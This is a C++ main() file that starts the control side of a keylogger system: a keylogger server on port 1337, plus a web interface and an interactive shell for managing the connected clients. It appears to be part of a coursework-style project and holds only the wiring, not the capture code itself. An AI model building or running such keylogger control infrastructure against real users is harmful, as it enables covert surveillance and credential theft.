#include <thread>
#include <csignal>
#include "CommandCenter.h"
#include "SpiderServer.h"
#include "WebServer.h"
#include "Shell.h"
#include "Logger.hpp"

static volatile bool running = true;

static void sigintHandler(int)
{
  running = false;
}

int main()
{
  int ret = EXIT_SUCCESS;

  try
    {
      nope::log::Logger::start("spider_server.log");
      nope::log::Logger::logLevel = nope::log::LogLevel::LOG_DEBUG;

      nope::log::Log(Info) << "Logger started";
    }
  catch (std::exception const &e)
    {
      std::cerr << "Fatal error while initializing the logger: " << e.what()
                << std::endl;
      return (EXIT_FAILURE);
    }

  std::signal(SIGINT, &sigintHandler);

  try
    {
      // Create and initialize CommandCenter
      spider::server::CommandCenter cmdCenter("./plugins");

      // Create keylogger server
      spider::server::SpiderServer keyloggerServer(cmdCenter, running, 1337);

      // Create controllers here
      spider::http::WebServer httpServer(cmdCenter, running, 8080,
                                         keyloggerServer.getClients());
      spider::shell::Shell shellControl(cmdCenter, running,
                                        keyloggerServer.getClients());

      // Add controllers to keylogger server
      keyloggerServer.addController(httpServer);
      keyloggerServer.addController(shellControl);

      // Run controllers
      std::thread httpServerThread{[&]() { httpServer.run(); }};
      std::thread shellThread{[&]() { shellControl.run(); }};

      // Run server
      keyloggerServer.run();

      // Stop controllers
      if (httpServerThread.joinable())
	{
	  httpServerThread.join();
	}
      if (shellThread.joinable())
	{
	  shellThread.join();
	}
    }
  catch (std::exception const &e)
    {
      std::cerr << e.what() << std::endl;
      ret = EXIT_FAILURE;
    }

  return (ret);
}
